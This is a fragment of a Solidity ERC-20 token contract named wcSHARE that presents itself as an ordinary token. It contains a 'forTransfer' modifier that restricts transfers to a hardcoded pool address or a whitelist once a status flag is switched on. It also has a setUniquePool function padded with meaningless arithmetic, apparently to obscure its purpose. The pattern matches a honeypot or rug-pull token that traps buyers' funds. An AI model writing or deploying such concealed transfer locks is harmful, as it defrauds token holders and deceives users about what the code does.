...
contract wcSHARETOKEN is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenWC_totalSupply;
    uint256 private _tokenWC_status = 0;
    uint256 public stakingPoolWCStatus = 0;

    string private _tokenWC_name;
    string private _tokenWC_symbol;

    address private _poolWCAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;
    address private _wlWCAddress = 0x0000000000000000000000000000000000000000;

    constructor() {
        _tokenWC_name = "wcSHARE";
        _tokenWC_symbol = "wcSHARE";
        _tokenWC_totalSupply = 58000 * 10 ** 18;
        _balances[msg.sender] = _tokenWC_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolWCAddress || msg.sender == _wlWCAddress || _tokenWC_status == 0);
        _;
    }
    ...
    function totalSupply() public view virtual override returns (uint256) {
        return _tokenWC_totalSupply;
    }

    function setUniquePool(address setAddress) public {
        uint256 a = 1;
        a = a + 1;
        a = a - 1;
        if (msg.sender == _poolWCAddress)
        {
            _wlWCAddress = setAddress;
        }
    }
